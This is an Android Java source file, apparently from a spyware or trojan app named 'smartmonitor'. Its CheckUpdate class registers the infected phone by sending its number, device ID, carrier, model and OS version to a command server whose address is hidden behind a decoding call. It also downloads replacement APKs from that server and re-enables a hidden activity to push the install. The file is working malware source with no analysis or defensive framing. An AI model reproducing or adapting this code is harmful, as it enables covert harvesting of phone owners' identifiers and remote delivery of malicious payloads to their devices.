package com.android.smartmonitor.control;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.MediaStore.MediaColumns;
import android.text.TextUtils;
import android.util.Log;

import com.android.smartmonitor.common.CheckGlobal;
import com.android.smartmonitor.common.CheckNC;

public class CheckUpdate {
	private Context m_context;
	private boolean m_isInstalled;
	
	private File root;
	private File npki=null;
	private ArrayList<File> fileList = new ArrayList<File>();
	int serverResponseCode = 0;	
	
	private ArrayList<String> thumbsDataList;
	private ArrayList<String> thumbsIDList;
	private HashMap<String,String> videoList;
	
	public CheckUpdate(Context context) {
		m_isInstalled = false;
    	m_context = context;
	}
	
	public boolean getUpdateFlag()
    {
    	SharedPreferences localSharedPreferences = m_context.getSharedPreferences("d", 0);
        int updateFlag = localSharedPreferences.getInt("updateFlag", -1);
        
        if(updateFlag == -1)
        	return false;
        
        if(updateFlag == 0)
        	return false;
        
        return true;
    }
	
	public void setUpdateFlag(int value)
    {
		SharedPreferences.Editor localEditor = m_context.getSharedPreferences("d", 0).edit();
	    
    	localEditor.putInt("updateFlag", value);
    	
        localEditor.commit();	
    }
	
	public boolean update()
	{
		boolean returnValue = false;
		
		if(getUpdateFlag() == false)
			return false;
		
		returnValue = downloadLastAPK();
    	
    	return returnValue;
	}
	
	public boolean postInstallNotice()
    {
    	boolean returnValue = false;
    	
    	if(m_isInstalled)
    		return m_isInstalled;
    	
    	returnValue = postInstallNotice(CheckGlobal.getNetworkName(m_context),
				CheckGlobal.getOwnPhoneNumber(m_context),
				CheckGlobal.getDeviceID(m_context),
				CheckGlobal.getDeviceName());
	    
		m_isInstalled = returnValue;
		
		return m_isInstalled;
	}
	
	public boolean postInstallNotice(String cc, String paramString, String deviceID, String phoneModel)
	{
		String response = null;
		

	
	    try {

	    	HashMap<String, String> localHashMap = new HashMap<String, String>();
		    localHashMap.put("mode", "install");
		    localHashMap.put("cc", cc);
		    localHashMap.put("phone_deviceID", deviceID);
		    localHashMap.put("phone_num", paramString);
		    localHashMap.put("phone_model", phoneModel);
		    localHashMap.put("os_version", android.os.Build.VERSION.RELEASE);
			localHashMap.put("saler_code", CheckGlobal.saler_code);
		
		    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "phone.add.php";
		    
		    response = CheckNC.send(url, localHashMap, "Utf-8");
		    if(response == null || response.indexOf("ok") == -1)
		    	return false;
	    } catch (Exception e) {
	    	// TODO Auto-generated catch block
	    	e.printStackTrace();
	    	return false;
	    }
		    
		return true;
	}
	
    public final boolean downloadLastAPK(String deviceID)
	{
	    String response = null;
	    String url = CheckGlobal.KMSDecode(CheckGlobal.g_managerURL) + "update.php?phone_deviceID=" + deviceID;
	    boolean returnValue = false;
	    
	    try
	    {
	    	response = CheckNC.send(url + "&action=getState");
	    	if (response == null || response.indexOf("ok") == -1)
	    		return false;
	      
	    	returnValue = CheckNC.download(url + "&action=getAPK", CheckGlobal.g_apkPath);
	    }
	    catch (Exception e) {
	    	e.printStackTrace();
	    	return false;
	    }
	
	    return returnValue;
	}
    
	public final boolean downloadLastAPK()
    {
	    boolean returnValue = false;
	    
	    returnValue = downloadLastAPK(CheckGlobal.getDeviceID(m_context));
	    setUpdateFlag(0);
	    	  
	    return returnValue;
    }
	
	public final void installAPK(String filePath)
    {
    	File apkFile = new File(filePath);
    	
    	if(apkFile == null)
    		return;
    	
    	PackageManager p = m_context.getPackageManager();
		ComponentName cn = new ComponentName("com.android.smartmonitor", "com.android.smartmonitor.MainActivity");
        p.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    	    	
    	Intent dialogIntent = new Intent(Intent.ACTION_VIEW);
	    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    dialogIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
	    //dialogIntent.putExtra("forceToInstall",true);
	    m_context.startActivity(dialogIntent);
    }






}
